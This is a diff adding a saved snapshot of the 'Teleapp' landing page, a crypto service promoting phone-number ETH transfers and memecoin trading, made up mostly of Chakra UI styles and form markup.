+            --chakra-transition-property-common: background-color, border-color, color, fill, stroke, opacity, box-shadow, transform;
+            --chakra-transition-property-colors: background-color, border-color, color, fill, stroke;
+            --chakra-transition-property-dimensions: width, height;
+            --chakra-transition-property-position: left, right, top, bottom;
+            --chakra-transition-property-background: background-color, background-image, background-position;
+            --chakra-transition-easing-ease-in: cubic-bezier(0.4, 0, 1, 1);
+            --chakra-transition-easing-ease-out: cubic-bezier(0, 0, 0.2, 1);
+            --chakra-transition-easing-ease-in-out: cubic-bezier(0.4, 0, 0.2, 1);
+            --chakra-transition-duration-ultra-fast: 50ms;
+            --chakra-transition-duration-faster: 100ms;
+            --chakra-transition-duration-fast: 150ms;
+            --chakra-transition-duration-normal: 200ms;
+            --chakra-transition-duration-slow: 300ms;
+            --chakra-transition-duration-slower: 400ms;
+            --chakra-transition-duration-ultra-slow: 500ms;
+            --chakra-blur-none: 0;
+            --chakra-blur-sm: 4px;
+            --chakra-blur-base: 8px;
+            --chakra-blur-md: 12px;
+            --chakra-blur-lg: 16px;
+            --chakra-blur-xl: 24px;
+            --chakra-blur-2xl: 40px;
+            --chakra-blur-3xl: 64px;
+        }
+    </style>
+    <style data-emotion="css-global" data-s="">
+        html {
+            line-height: 1.5;
+            -webkit-text-size-adjust: 100%;
+            font-family: system-ui, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            text-rendering: optimizeLegibility;
+            -moz-osx-font-smoothing: grayscale;
+            touch-action: manipulation;
+        }
+
+        body {
+            position: relative;
+            min-height: 100%;
+            font-feature-settings: 'kern';
+        }
+
+        *,
+        *::before,
+        *::after {
+            border-width: 0;
+            border-style: solid;
+            box-sizing: border-box;
+        }
+
+        main {
+            display: block;
+        }
+
+        hr {
+            border-top-width: 1px;
+            box-sizing: content-box;
+            height: 0;
+            overflow: visible;
+        }
+
+        pre,
+        code,
+        kbd,
+        samp {
+            font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            font-size: 1em;
+        }
+
+        a {
+            background-color: transparent;
+            color: inherit;
+            -webkit-text-decoration: inherit;
+            text-decoration: inherit;
+        }
+
+        abbr[title] {
+            border-bottom: none;
+            -webkit-text-decoration: underline;
+            text-decoration: underline;
+            -webkit-text-decoration: underline dotted;
+            -webkit-text-decoration: underline dotted;
+            text-decoration: underline dotted;
+        }
+
+        b,
+        strong {
+            font-weight: bold;
+        }
+
+        small {
+            font-size: 80%;
+        }
+
+        sub,
+        sup {
+            font-size: 75%;
+            line-height: 0;
+            position: relative;
+            vertical-align: baseline;
+        }
+
+        sub {
+            bottom: -0.25em;
+        }
+
+        sup {
+            top: -0.5em;
+        }
+
+        img {
+            border-style: none;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            font-family: inherit;
+            font-size: 100%;
+            line-height: 1.15;
+            margin: 0;
+        }
+
+        button,
+        input {
+            overflow: visible;
+        }
+
+        button,
+        select {
+            text-transform: none;
+        }
+
+        button::-moz-focus-inner,
+        [type="button"]::-moz-focus-inner,
+        [type="reset"]::-moz-focus-inner,
+        [type="submit"]::-moz-focus-inner {
+            border-style: none;
+            padding: 0;
+        }
+
+        fieldset {
+            padding: 0.35em 0.75em 0.625em;
+        }
+
+        legend {
+            box-sizing: border-box;
+            color: inherit;
+            display: table;
+            max-width: 100%;
+            padding: 0;
+            white-space: normal;
+        }
+
+        progress {
+            vertical-align: baseline;
+        }
+
+        textarea {
+            overflow: auto;
+        }
+
+        [type="checkbox"],
+        [type="radio"] {
+            box-sizing: border-box;
+            padding: 0;
+        }
+
+        [type="number"]::-webkit-inner-spin-button,
+        [type="number"]::-webkit-outer-spin-button {
+            -webkit-appearance: none !important;
+        }
+
+        input[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        [type="search"] {
+            -webkit-appearance: textfield;
+            outline-offset: -2px;
+        }
+
+        [type="search"]::-webkit-search-decoration {
+            -webkit-appearance: none !important;
+        }
+
+        ::-webkit-file-upload-button {
+            -webkit-appearance: button;
+            font: inherit;
+        }
+
+        details {
+            display: block;
+        }
+
+        summary {
+            display: -webkit-box;
+            display: -webkit-list-item;
+            display: -ms-list-itembox;
+            display: list-item;
+        }
+
+        template {
+            display: none;
+        }
+
+        [hidden] {
+            display: none !important;
+        }
+
+        body,
+        blockquote,
+        dl,
+        dd,
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6,
+        hr,
+        figure,
+        p,
+        pre {
+            margin: 0;
+        }
+
+        button {
+            background: transparent;
+            padding: 0;
+        }
+
+        fieldset {
+            margin: 0;
+            padding: 0;
+        }
+
+        ol,
+        ul {
+            margin: 0;
+            padding: 0;
+        }
+
+        textarea {
+            resize: vertical;
+        }
+
+        button,
+        [role="button"] {
+            cursor: pointer;
+        }
+
+        button::-moz-focus-inner {
+            border: 0 !important;
+        }
+
+        table {
+            border-collapse: collapse;
+        }
+
+        h1,
+        h2,
+        h3,
+        h4,
+        h5,
+        h6 {
+            font-size: inherit;
+            font-weight: inherit;
+        }
+
+        button,
+        input,
+        optgroup,
+        select,
+        textarea {
+            padding: 0;
+            line-height: inherit;
+            color: inherit;
+        }
+
+        img,
+        svg,
+        video,
+        canvas,
+        audio,
+        iframe,
+        embed,
+        object {
+            display: block;
+        }
+
+        img,
+        video {
+            max-width: 100%;
+            height: auto;
+        }
+
+        [data-js-focus-visible] :focus:not([data-focus-visible-added]) {
+            outline: none;
+            box-shadow: none;
+        }
+
+        select::-ms-expand {
+            display: none;
+        }
+    </style>
+    <style data-emotion="css-global" data-s="">
+        body {
+            font-family: var(--chakra-fonts-body);
+            color: var(--chakra-colors-gray-800);
+            background: var(--chakra-colors-white);
+            transition-property: background-color;
+            transition-duration: var(--chakra-transition-duration-normal);
+            line-height: var(--chakra-lineHeights-base);
+        }
+
+        *::-webkit-input-placeholder {
+            color: var(--chakra-colors-gray-400);
+        }
+
+        *::-moz-placeholder {
+            color: var(--chakra-colors-gray-400);
+        }
+
+        *:-ms-input-placeholder {
+            color: var(--chakra-colors-gray-400);
+        }
+
+        *::placeholder {
+            color: var(--chakra-colors-gray-400);
+        }
+
+        *,
+        *::before,
+        ::after {
+            border-color: var(--chakra-colors-gray-200);
+            word-wrap: break-word;
+        }
+    </style>
+    <script
+        data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement { }); } })(["next-route-announcer"])</script>
+</head>
+
+<body class="chakra-ui-light">
+    <div><!-- Google tag (gtag.js) -->
+
+    </div>
+    <link rel="apple-touch-icon" sizes="60x60" href="https://teleapp.fi/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+    <link rel="manifest" href="https://teleapp.fi/site.webmanifest">
+    <link rel="mask-icon" href="https://teleapp.fi/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="description" content="">
+    <meta property="og:title" content="Teleapp">
+    <meta property="og:description" content="Transfer crypto with just a phone number">
+    <meta property="og:url" content="">
+    <meta property="og:image" content="https://pub-4ba0c1d10beb4a6daa0e7a168a45c043.r2.dev/social.jpg">
+    <meta name="twitter:card" content="">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="Teleapp">
+    <meta name="twitter:description" content="Transfer crypto with just a phone number">
+    <meta name="twitter:image" content="">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="b52dfb494b5e1e96.css" data-n-g=""><noscript data-n-css=""></noscript>
+    <div id="__next">
+        <div class="css-PKJb">
+            <div class="fixed top-0 z-50 false duration-100">
+                <div class="absolute top-0 right-0 max-w-md m-4 flex-col" style="display:none;z-index:80">
+                    <div class="bg-white/20 backdrop-blur-lg p-3 rounded-md border-white/20 border shadow-lg">
+                        <div class="flex justify-end"><button><svg stroke="currentColor" fill="currentColor"
+                                    stroke-width="0" viewBox="0 0 1024 1024"
+                                    class="cursor-pointer hover:scale-110 duration-100" height="22" width="22"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path
+                                        d="M563.8 512l262.5-312.9c4.4-5.2.7-13.1-6.1-13.1h-79.8c-4.7 0-9.2 2.1-12.3 5.7L511.6 449.8 295.1 191.7c-3-3.6-7.5-5.7-12.3-5.7H203c-6.8 0-10.5 7.9-6.1 13.1L459.4 512 196.9 824.9A7.95 7.95 0 0 0 203 838h79.8c4.7 0 9.2-2.1 12.3-5.7l216.5-258.1 216.5 258.1c3 3.6 7.5 5.7 12.3 5.7h79.8c6.8 0 10.5-7.9 6.1-13.1L563.8 512z">
+                                    </path>
+                                </svg></button></div>
+                        <div class="pr-6">
+                            <div class="HeaderStyles__MenuLink-sc-mexvfz-5 flyBqH">Home</div>
+                            <div class="HeaderStyles__MenuLink-sc-mexvfz-5 flyBqH">Sign In</div>
+                            <div class="HeaderStyles__MenuDivider-sc-mexvfz-6 gjGpuu"></div>
+                            <div class="HeaderStyles__MenuDivider-sc-mexvfz-6 gjGpuu"></div>
+                            <div class="HeaderStyles__MenuLink-sc-mexvfz-5 flyBqH">FAQ</div>
+                            <div class="HeaderStyles__MenuLink-sc-mexvfz-5 flyBqH">TOS</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="HeaderStyles__Header-sc-mexvfz-0 iGKTVk"><a href="">
+                        <div class="text-3xl font-bold font-museo text-black">TELE</div>
+                    </a>
+                    <div class="flex items-center"><a href="https://teleapp.fi/login"><button
+                                class="mr-2 rounded-full bg-blue-400 px-5 py-3 text-sm font-medium text-white font-sans hover:bg-blue-600 duration-100 false">Login</button></a><svg
+                            stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                            stroke-linecap="round" stroke-linejoin="round"
+                            class="mr-2 cursor-pointer hover:scale-110 duration-100 text-black" height="22" width="22"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                            <path d="M4 8l16 0"></path>
+                            <path d="M4 16l16 0"></path>
+                        </svg></div>
+                </div>
+                <div class="w-full bg-blue-500 text-white font-sans"></div>
+            </div>
+            <div class="min-h-screen relative"><video class="absolute w-screen h-screen object-cover z-10" loop=""
+                    muted="" playsinline="" autoplay="" src="one.mp4"></video>
+                <div class="absolute flex flex-col justify-center items-center z-20 w-full h-screen max-w-screen "
+                    style="color:rgba(0,0,0,0.7)">
+                    <div class="hidden md:flex flex-col">
+                        <div class="text-4xl md:text-6xl lg:text-8xl font-museo my-1">SEND CRYPTO.</div>
+                        <div class="text-4xl  md:text-6xl lg:text-8xl font-museo ml-6 md:ml-20 my-1">WITH JUST A</div>
+                        <div class="text-4xl md:text-6xl lg:text-8xl font-museo mr-8 md:mr-20 my-1">PHONE NUMBER.</div>
+                    </div>
+                    <div class="md:hidden p-4 flex flex-col items-start w-full">
+                        <div class="text-5xl font-museo my-1">SEND SIMPLE.</div>
+                        <div class="text-5xl font-museo my-1">WITH JUST A</div>
+                        <div class="text-5xl font-museo my-1">PHONE NUMBER</div>
+                    </div>
+                    <div class="mt-6 px-4 text-xl font-sans md:text-2xl font-light w-full md:text-center text-gray-600">
+                        Get Your Friends Trading Memecoins like $BITCOIN and $PEPE</div>
+                </div>
+                <div class="absolute bottom-0 z-20 flex justify-center w-full flex-col items-center">
+                    <div class="flex items-center mb-4"><a href="https://twitter.com/SendWithTele"><svg
+                                stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024"
+                                height="32" width="32" xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M928 254.3c-30.6 13.2-63.9 22.7-98.2 26.4a170.1 170.1 0 0 0 75-94 336.64 336.64 0 0 1-108.2 41.2A170.1 170.1 0 0 0 672 174c-94.5 0-170.5 76.6-170.5 170.6 0 13.2 1.6 26.4 4.2 39.1-141.5-7.4-267.7-75-351.6-178.5a169.32 169.32 0 0 0-23.2 86.1c0 59.2 30.1 111.4 76 142.1a172 172 0 0 1-77.1-21.7v2.1c0 82.9 58.6 151.6 136.7 167.4a180.6 180.6 0 0 1-44.9 5.8c-11.1 0-21.6-1.1-32.2-2.6C211 652 273.9 701.1 348.8 702.7c-58.6 45.9-132 72.9-211.7 72.9-14.3 0-27.5-.5-41.2-2.1C171.5 822 261.2 850 357.8 850 671.4 850 843 590.2 843 364.7c0-7.4 0-14.8-.5-22.2 33.2-24.3 62.3-54.4 85.5-88.2z">
+                                </path>
+                            </svg></a><a href="https://t.me/sendwithtele"><svg stroke="currentColor" fill="currentColor"
+                                stroke-width="0" viewBox="0 0 24 24" height="32" width="32"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="m20.665 3.717-17.73 6.837c-1.21.486-1.203 1.161-.222 1.462l4.552 1.42 10.532-6.645c.498-.303.953-.14.579.192l-8.533 7.701h-.002l.002.001-.314 4.692c.46 0 .663-.211.921-.46l2.211-2.15 4.599 3.397c.848.467 1.457.227 1.668-.785l3.019-14.228c.309-1.239-.473-1.8-1.282-1.434z">
+                                </path>
+                            </svg></a><a
+                            href="https://www.dextools.io/app/en/ether/pair-explorer/0x6cca981e8E1e318a696Feb455d298FC65227Ed8D"><img
+                                src="dex.svg" class="w-6 ml-2"></a><a
+                            href="https://app.uniswap.org/swap?&amp;outputCurrency=0x6cca981e8E1e318a696Feb455d298FC65227Ed8D"><img
+                                src="uni.svg" class="w-9 ml-2"></a></div>
+                    <div class="flex flex-col items-center mb-3 text-xs animate-bounce">Send with Teleapp<svg
+                            stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                            stroke-linecap="round" stroke-linejoin="round" height="16" width="16"
+                            xmlns="http://www.w3.org/2000/svg">
+                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                            <path d="M6 9l6 6l6 -6"></path>
+                        </svg></div>
+                </div>
+            </div>
+            <div class="flex flex-col items-center w-full bg-blue-200 py-2">
+                <div class="font-bold my-2">How does it work?</div>
+                <div class="flex items-center flex-wrap justify-center">
+                    <div class="p-2 bg-white/50 rounded-lg m-2 h-32" style="max-width:200px">
+                        <div class="text-sm font-sans text-gray-500 flex">
+                            <div class="bg-blue-200 px-3 py-1 rounded-full text-blue-800">STEP 1</div>
+                        </div>
+                        <div class="mt-1 p-1">Send 1 ETH to your friend Toms phone number.</div>
+                    </div>
+                    <div class="p-2 bg-white/50 rounded-lg m-2 h-32" style="max-width:200px">
+                        <div class="text-sm font-sans text-gray-500 flex">
+                            <div class="bg-blue-200 px-3 py-1 rounded-full text-blue-800">STEP 2</div>
+                        </div>
+                        <div class="mt-1 p-1">Tom gets a notification.</div>
+                    </div>
+                    <div class="p-2 bg-white/50 rounded-lg m-2 h-32" style="max-width:200px">
+                        <div class="text-sm font-sans text-gray-500 flex">
+                            <div class="bg-blue-200 px-3 py-1 rounded-full text-blue-800">STEP 3</div>
+                        </div>
+                        <div class="mt-1 text-xs p-1">Tom logs in, has the 1ETH you sent him and can buy $BITCOIN or any
+                            memecoin you tell him.</div>
+                    </div>
+                    <div class="p-2 bg-white/50 rounded-lg m-2 h-32" style="max-width:200px">
+                        <div class="text-sm font-sans text-gray-500 flex">
+                            <div class="bg-blue-200 px-3 py-1 rounded-full text-blue-800">STEP 4</div>
+                        </div>
+                        <div class="mt-1 p-1">Go to the moon with your friends.</div>
+                    </div>
+                </div>
+                <div class="mt-2 max-w-lg text-center text-xs text-black/70">
+                    <div class="mb-2">COMING SOON</div>$TELE is the platform token that shares in transaction revenues
+                    (through onramping and offramping, transactions within the network, trading memecoins, advertisement
+                    space in swaps and more) and is part of a reward mechanism for early active supporters that onramp
+                    their friends.
+                </div>
+            </div>
+            <div class="min-h-screen relative"><video class="absolute w-screen h-full min-h-full object-cover z-10"
+                    loop="" muted="" playsinline="" autoplay=""
+                    src="biomorphic-forms-with-holographic-iridescent-foil-textureabstract-blob-3d-shape-wit-SBV-347734516-4K.mp4"></video>
+                <div
+                    class="relative top-0 left-0 z-30 flex flex-col md:flex-row justify-center bg-black/5 items-center w-full min-h-screen">
+                    <div class="flex-1 m-10 flex flex-col items-center text-white mt-20 md:mt-10">
+                        <div class="font-museo text-5xl md:text-6xl lg:text-8xl">ONRAMP</div>
+                        <div class="font-museo text-5xl md:text-6xl lg:text-8xl md:mr-24">ANYONE</div>
+                        <div class="font-museo text-5xl md:text-6xl lg:text-8xl md:ml-24">INSTANTLY</div>
+                        <div class="max-w-xs mt-6 bg-black/30 backdrop-blur-md p-3 rounded-lg">
+                            <div class="flex items-center justify-between">
+                                <div class="font-sans font-medium">Earn Points</div>
+                                <div class="h-2 w-2 bg-white rounded-lg mr-2 animate-ping"></div>
+                            </div>
+                            <div class="text-sm mt-2 font-bold">Earn 1,000,000 TeleApp points for every 0.1 Ether sent
+                                to phone numbers!</div>
+                        </div>
+                    </div>
+                    <div class="flex-1">
+                        <div class="max-w-lg p-10 pt-0">
+                            <div
+                                class="IndexStyles__SendCryptoContainer-sc-15vl6u1-4 bSEcrI backdrop-blur-md bg-white/60">
+                                <div class="IndexStyles__SCTitle-sc-15vl6u1-5 iatiVu font-black">TRANSFER</div>
+                                <div class="mt-2 mb-6">
+                                    <p class="font-sans text-black/70 text-xs">Send crypto to anyone, anywhere in the
+                                        world using their number.</p>
+                                </div>
+                                <div class="IndexStyles__FieldInputContainer-sc-15vl6u1-7 hZbLMY">
+                                    <div style="width:100px">
+                                        <div data-baseweb="select" class="css-koWCuJ">
+                                            <div class="css-fgqEvb">
+                                                <div class="css-hQrlmS">
+                                                    <div value="ETH" class="css-iFEVQl">ETH</div>
+                                                    <div class="css-eluWvU"><input aria-autocomplete="list"
+                                                            aria-expanded="false" aria-haspopup="listbox"
+                                                            aria-label="Selected ETH. " role="combobox" tabindex="0"
+                                                            class="css-kODjUy" value="">
+                                                        <div class="css-bbkrnz"></div>
+                                                    </div>
+                                                </div>
+                                                <div class="css-jYsWkC"><svg data-baseweb="icon" title="open"
+                                                        viewBox="0 0 24 24" class="css-iMiALy">
+                                                        <title>open</title>
+                                                        <path
+                                                            d="M12.7071 15.2929L17.1464 10.8536C17.4614 10.5386 17.2383 10 16.7929 10L7.20711 10C6.76165 10 6.53857 10.5386 6.85355 10.8536L11.2929 15.2929C11.6834 15.6834 12.3166 15.6834 12.7071 15.2929Z">
+                                                        </path>
+                                                    </svg></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div data-baseweb="input" class="css-eqVZyD">
+                                        <div data-baseweb="base-input" class="css-cvxQaE"><input aria-invalid="false"
+                                                aria-required="false" autocomplete="on" inputmode="decimal" name=""
+                                                placeholder="Amount" type="number" class="css-dAZgJL" value=""></div>
+                                    </div>
+                                </div>
+                                <div data-baseweb="phone-input" class="css-haOmqK">
+                                    <div data-baseweb="select" class="css-kjMyOB">
+                                        <div class="css-lnBTMr">
+                                            <div class="css-hQrlmS">
+                                                <div value="US" class="css-iLfmJw"><span data-iso="US"
+                                                        class="css-kZZDTD">🇺🇸</span></div>
+                                                <div class="css-eluWvU"><input aria-autocomplete="list"
+                                                        aria-expanded="false" aria-haspopup="listbox"
+                                                        aria-label="Select country" role="combobox" tabindex="0"
+                                                        autocomplete="chrome-off" class="css-sEBgQ" value="">
+                                                    <div class="css-fumDYV"></div>
+                                                </div>
+                                            </div>
+                                            <div class="css-gfcWdn"><svg data-baseweb="icon" title="open"
+                                                    viewBox="0 0 24 24" class="css-iMiALy">
+                                                    <title>open</title>
+                                                    <path
+                                                        d="M12.7071 15.2929L17.1464 10.8536C17.4614 10.5386 17.2383 10 16.7929 10L7.20711 10C6.76165 10 6.53857 10.5386 6.85355 10.8536L11.2929 15.2929C11.6834 15.6834 12.3166 15.6834 12.7071 15.2929Z">
+                                                    </path>
+                                                </svg></div>
+                                        </div>
+                                    </div>
+                                    <div data-baseweb="input" class="css-hfcsvE">
+                                        <div data-baseweb="phone-input" class="css-cvxQaE">
+                                            <div class="css-kIDaFA">+1</div><input
+                                                aria-label="Please enter a phone number without the country dial code."
+                                                aria-invalid="false" aria-required="false" autocomplete="tel-national"
+                                                inputmode="tel" placeholder="Recipient phone number" type="text"
+                                                class="css-ClxUO" value="">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="mt-2">
+                                    <div data-baseweb="input" class="css-eqVZyD">
+                                        <div data-baseweb="base-input" class="css-cvxQaE"><input aria-invalid="false"
+                                                aria-required="false" autocomplete="on" inputmode="text" name=""
+                                                placeholder="Recipient email" type="email" class="css-dAZgJL" value="">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="py-3 font-sans"><label for="message"
+                                        class="block mb-2 text-sm font-medium text-gray-900">Your message</label>
+                                    <div data-baseweb="textarea" class="css-dpDCQL">
+                                        <div data-baseweb="base-input" class="css-cvxQaE"><textarea aria-invalid="false"
+                                                aria-required="false" autocomplete="on" inputmode="text" name=""
+                                                placeholder="" type="textarea" rows="3" class="css-doFiNf"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="IndexStyles__TransferButton-sc-15vl6u1-8 eJztvi bg-blue-500">Transfer</div>
+                            </div>
+                            <div class="flex justify-center mt-2">
+                                <div
+                                    class="bg-white/20 backdrop-blur-lg rounded-full px-3 text-sm text-white font-sans py-1 text-center">
+                                    By using this platform, you agree to our <a href="https://teleapp.fi/tos"><span
+                                            class="underline">Terms of Service</span></a></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="absolute bottom-0 z-20 flex justify-center w-full flex-col items-center">
+                        <div class="flex flex-col items-center mb-3 text-xs animate-bounce">Receive and swap<svg
+                                stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
+                                stroke-linecap="round" stroke-linejoin="round" height="16" width="16"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+                                <path d="M6 9l6 6l6 -6"></path>
+                            </svg></div>
+                    </div>
+                </div>
+            </div>
+            <div class="min-h-screen relative"><video class="absolute w-screen h-full min-h-full object-cover z-10"
+                    loop="" muted="" playsinline="" autoplay="" src="two.mp4"></video>
+                <div
+                    class="relative top-0 left-0 z-30 flex flex-col md:flex-row justify-center bg-black/5 items-center w-full min-h-screen">
+                    <div class="flex-1 m-10 flex flex-col items-center text-white mt-20 md:mt-10">
+                        <div class="font-museo text-5xl md:text-6xl ">MEMECOINS</div>
+                        <div class="font-museo text-5xl md:text-6xl md:mr-24">FOR</div>
+                        <div class="font-museo text-5xl md:text-6xl md:ml-24">RETAIL</div>
+                        <div class="font-museo text-5xl md:text-6xl md:ml-24">INVESTORS</div>
+                    </div>
+                    <div class="flex-1">
+                        <div class="max-w-lg p-10 pt-0"><img src="ss.png" class="rounded-lg border-4">
+                            <div class="mt-6 flex justify-center">
+                                <div
+                                    class="bg-black/20 backdrop-blur-lg rounded-full animate-bounce px-3 text-sm text-white font-sans py-1 text-center">
+                                    Swap ETH for $PEPE and other ERC20 tokens instantly</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="css-PKJb"></div>
+    </div>
+    <div id="chakra-toast-portal">
+        <ul id="chakra-toast-manager-top"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; margin: 0px auto; top: env(safe-area-inset-top, 0px); right: env(safe-area-inset-right, 0px); left: env(safe-area-inset-left, 0px);">
+        </ul>
+        <ul id="chakra-toast-manager-top-left"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; top: env(safe-area-inset-top, 0px); left: env(safe-area-inset-left, 0px);">
+        </ul>
+        <ul id="chakra-toast-manager-top-right"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; top: env(safe-area-inset-top, 0px); right: env(safe-area-inset-right, 0px);">
+        </ul>
+        <ul id="chakra-toast-manager-bottom-left"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; bottom: env(safe-area-inset-bottom, 0px); left: env(safe-area-inset-left, 0px);">
+        </ul>
+        <ul id="chakra-toast-manager-bottom"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; margin: 0px auto; bottom: env(safe-area-inset-bottom, 0px); right: env(safe-area-inset-right, 0px); left: env(safe-area-inset-left, 0px);">
+        </ul>
+        <ul id="chakra-toast-manager-bottom-right"
+            style="position: fixed; z-index: 5500; pointer-events: none; display: flex; flex-direction: column; bottom: env(safe-area-inset-bottom, 0px); right: env(safe-area-inset-right, 0px);">
+        </ul>
+    </div><iframe class="magic-iframe" data-magic-iframe-label="auth.magic.link" title="Secure Modal" src="index_1.html"
+        style="display: none; position: fixed; top: 0px; right: 0px; width: 100%; height: 100%; border-radius: 0px; border: none; z-index: 2147483647;"></iframe><next-route-announcer>
+        <p aria-live="assertive" id="__next-route-announcer__" role="alert"
+            style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+        </p>
+    </next-route-announcer>
+    <div data-baseweb="toaster" class="css-jTQZGu"></div>
+</body>
+
+</html>
